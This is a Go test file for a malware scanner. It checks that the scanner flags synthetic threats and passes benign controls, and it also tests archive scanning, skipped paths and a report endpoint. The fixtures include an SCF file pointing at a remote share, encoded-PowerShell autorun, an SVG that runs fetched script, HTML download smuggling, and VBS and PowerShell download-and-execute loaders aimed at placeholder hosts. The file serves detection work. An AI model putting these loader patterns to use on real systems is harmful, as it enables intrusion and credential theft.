package main

import (
    "archive/zip"
    "bytes"
    "context"
    "encoding/json"
    "net/http"
    "net/http/httptest"
    "os"
    "path/filepath"
    "strings"
    "testing"
)

func TestStage11SyntheticThreatsAndBenignControls(t *testing.T) {
    cases:=[]struct{name,data string; suspicious bool}{
        {"remote.scf",`[Shell]
Command=2
IconFile=\\lab.example.invalid\share\icon.ico
[Taskbar]
Command=ToggleDesktop
`,true},
        {"shell-local.scf",`[Shell]
Command=2
IconFile=C:\Windows\System32\shell32.dll,3
`,false},
        {"shell-comment.scf",`[Shell]
Command=2
;IconFile=\\lab.example.invalid\share\bad.ico
IconFile=C:\Windows\System32\shell32.dll,3
`,false},
        {"usb.inf",`[autorun]
open=powershell.exe -EncodedCommand AAAA
`,true},
        {"readme.inf",`[autorun]
open=Setup.exe
`,false},
        {"annotated.inf",`; [autorun]
; open=powershell.exe -EncodedCommand AAAA
[autorun]
open=setup.exe
`,false},
        {"loader.svg",`<svg xmlns="http://www.w3.org/2000/svg"><script>eval(fetch('https://example.invalid/js'))</script></svg>`,true},
        {"icon.svg",`<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="3"/></svg>`,false},
        {"svg-doc.svg",`<svg><text>Use eval(fetch()) only in security lectures</text></svg>`,false},
        {"smuggle.html",`<html><script>var x=atob('QQ=='); var f=new Blob([x]); var u=URL.createObjectURL(f); var a=document.createElement('a'); a.href=u; a.click()</script></html>`,true},
        {"benign-download.html",`<html><a href="https://example.invalid/download">Download</a></html>`,false},
        {"loader.vbs",`Set req = CreateObject("MSXML2.XMLHTTP")
req.Open "GET", "https://example.invalid/a", False
req.Send
Set stream = CreateObject("ADODB.Stream")
stream.SaveToFile "C:\temp\example.exe", 2
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\temp\example.exe"
`,true},
        {"vbs-doc.vbs",`' CreateObject("MSXML2.XMLHTTP") and ADODB.Stream and WScript.Shell
WScript.Echo "hello"
`,false},
        {"new-loader.ps1",`Invoke-WebRequest -Uri "https://example.invalid/update.exe" -OutFile $file
Start-Process -FilePath $file
`,true},
        {"ps1-note.ps1",`# Invoke-WebRequest -OutFile update.exe and Start-Process
Write-Output "hello"
`,false},
    }
    dir:=t.TempDir()
    tp,fp,tn,fn:=0,0,0,0
    for i,c:=range cases {
        p:=filepath.Join(dir,c.name)
        _=i
        if err:=os.WriteFile(p,[]byte(c.data),0600);err!=nil{t.Fatal(err)}
        st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
        got:=inspectFile(p,st)
        switch {
        case c.suspicious && got!=nil:tp++
        case c.suspicious && got==nil:fn++;t.Logf("missed: %s",c.name)
        case !c.suspicious && got!=nil:fp++;t.Logf("false positive: %s %v",c.name,got.Reasons)
        default:tn++
        }
    }
    t.Logf("STAGE11 new-format and behavior cases TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
    if fn!=0 || fp!=0 || tp!=6 || tn!=9 {t.Fatalf("Stage11 matrix mismatch")}
}

func TestStage11ArchiveNewFileFormats(t *testing.T) {
    entries:=[]struct{member,contents string;suspicious bool}{
        {"nested/remote.scf", "[Shell]\nCommand=2\nIconFile=\\\\lab.example.invalid\\share\\icon.ico\n",true},
        {"autorun.inf", "[autorun]\nopen=powershell -enc AAAA\n",true},
        {"static.svg", "<svg><circle r='2'/></svg>",false},
        {"hello.inf", "[autorun]\nopen=setup.exe\n",false},
    }
    for _,test:=range entries {
        t.Run(test.member,func(t *testing.T){
            var payload bytes.Buffer
            w:=zip.NewWriter(&payload)
            f,err:=w.Create(test.member);if err!=nil{t.Fatal(err)}
            if _,err=f.Write([]byte(test.contents));err!=nil{t.Fatal(err)}
            if err=w.Close();err!=nil{t.Fatal(err)}
            p:=filepath.Join(t.TempDir(),"bundle.zip")
            if err=os.WriteFile(p,payload.Bytes(),0600);err!=nil{t.Fatal(err)}
            st,_:=os.Stat(p)
            got:=inspectFile(p,st)
            if (got!=nil)!=test.suspicious {t.Fatalf("archive detection mismatch: %+v",got)}
        })
    }
}

func TestStage11SkippedPathReasonsAndCounts(t *testing.T) {
    dir:=t.TempDir()
    good:=filepath.Join(dir,"readme.txt")
    if err:=os.WriteFile(good,[]byte("ordinary"),0600);err!=nil{t.Fatal(err)}
    // Symlink creation may require elevated privileges on Windows.
    link:=filepath.Join(dir,"cyclic")
    if err:=os.Symlink(dir,link);err!=nil {t.Skip("symlinks unavailable: "+err.Error())}
    app:=newApp(nil)
    ctx,err:=app.begin("heuristic:custom");if err!=nil{t.Fatal(err)}
    err=app.runHeuristic(ctx,"custom",dir)
    app.finish(err)
    if err!=nil {t.Fatal(err)}
    st,_:=app.snapshot()
    _=st
    skipped:=app.skippedSnapshot()
    if len(skipped)!=1 || skipped[0].Path!=link || !strings.Contains(skipped[0].Reason,"reparse") {
        t.Fatalf("unexpected skipped path record: %+v",skipped)
    }
    status,_:=app.snapshot()
    if status.Skipped!=int64(len(skipped)) {t.Fatalf("skipped count differs from entries: %+v",status)}
}
func TestStage11MissingRootIsReported(t *testing.T) {
    path:=filepath.Join(t.TempDir(),"not-here")
    paths:=[]SkippedPath{}
    n,err:=walkNoLinksDetailed(context.Background(),path,func(string){},func(p,r string){paths=append(paths,SkippedPath{p,r})})
    if err==nil || n!=1 || len(paths)!=1 || paths[0].Path!=path {t.Fatalf("missing root not recorded: %d %v %+v",n,err,paths)}
}

func TestStage11ReportIncludesSkippedPaths(t *testing.T) {
    app:=newApp(nil)
    app.recordSkip(`C:\Users\Example\Documents\restricted.txt`,"access denied")
    server:=&Server{app:app,token:"test-token",address:"127.0.0.1:9999"}
    req:=httptest.NewRequest(http.MethodGet,"http://127.0.0.1:9999/api/report",nil)
    req.RemoteAddr="127.0.0.1:12345"
    req.Header.Set("X-Sentinel-Token","test-token")
    w:=httptest.NewRecorder()
    server.routes().ServeHTTP(w,req)
    if w.Code!=200 {t.Fatalf("report endpoint returned %d: %s",w.Code,w.Body.String())}
    var report struct{
        Version string `json:"version"`
        SkippedPaths []SkippedPath `json:"skippedPaths"`
        Status Status `json:"status"`
    }
    if err:=json.Unmarshal(w.Body.Bytes(),&report);err!=nil{t.Fatal(err)}
    if report.Version!="3.3" || len(report.SkippedPaths)!=1 || report.Status.Skipped!=1 ||
      report.SkippedPaths[0].Path!=`C:\Users\Example\Documents\restricted.txt` {
       t.Fatalf("report fields incorrect: %+v",report)
    }
    if report.SkippedPaths[0].Reason!="access denied" {t.Fatalf("missing reason")}
}
